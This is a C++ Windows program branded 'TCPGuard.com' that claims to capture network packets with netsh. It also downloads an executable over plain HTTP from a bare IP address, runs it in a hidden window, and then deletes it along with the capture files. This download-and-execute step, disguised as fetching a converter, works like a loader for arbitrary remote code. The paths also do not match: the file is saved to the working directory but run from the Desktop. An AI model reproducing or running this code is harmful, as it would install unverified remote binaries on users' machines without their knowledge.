// capture.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include<windows.h>
#include <shellapi.h>
#include <string>
#include <cstdio>
#pragma comment(lib, "Urlmon.lib")
using namespace std;

int main()
{
   
    system("title TCPGuard.com");

     wstring comm = L"";

     comm.append(L"/k C:\\Windows\\System32\\netsh.exe trace start capture=yes tracefile=C:\\Users\\%username%\\Desktop\\capture.etl");
     comm.append(L" && exit ");

	 HINSTANCE retVal = ShellExecuteW(NULL, L"open", L"cmd", comm.c_str(), NULL, SW_HIDE);
     cout << "TCPGuard.com Capturing Packets.." << endl;
     Sleep(10000);


     comm = L"";
     comm.append(L"/k C:\\Windows\\System32\\netsh.exe trace stop");
     comm.append(L" && exit ");

     ShellExecuteW(NULL, L"open", L"cmd", comm.c_str(), NULL, SW_HIDE);

     cout << "Collecting Data.. Please Wait" << endl;
     Sleep(86800);

     cout << "Downloading converter..." << endl;
     const wchar_t* srcURL = L"http://45.135.202.202/etl.exe";

     const wchar_t* destFile = L"etl2pcap.exe";
     if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
     {
         cout << "Download Converter Success" << endl;
     }
     else
     {
         cout << "Failed to Download" << endl;
     }
     Sleep(5000);
     cout << "Converting.." << endl;
    
     
     comm = L"";
     comm.append(L"/k C:\\Users\\%username%\\Desktop\\etl2pcap.exe capture.etl %date:~10,4%%date:~7,2%%date:~4,2%_%time:~1,1%%time:~3,2%.pcap");
     comm.append(L" && exit ");

     ShellExecuteW(NULL, L"open", L"cmd", comm.c_str(), NULL, SW_HIDE);
     Sleep(8000);


     comm = L"";
     comm.append(L"/k del C:\\Users\\%username%\\Desktop\\*.cab && del C:\\Users\\%username%\\Desktop\\*.etl && del C:\\Users\\%username%\\Desktop\\etl2pcap.exe");
     comm.append(L" && exit ");

     ShellExecuteW(NULL, L"open", L"cmd", comm.c_str(), NULL, SW_HIDE);


     cout << "all done" << endl;



  
     system("pause");
   

}
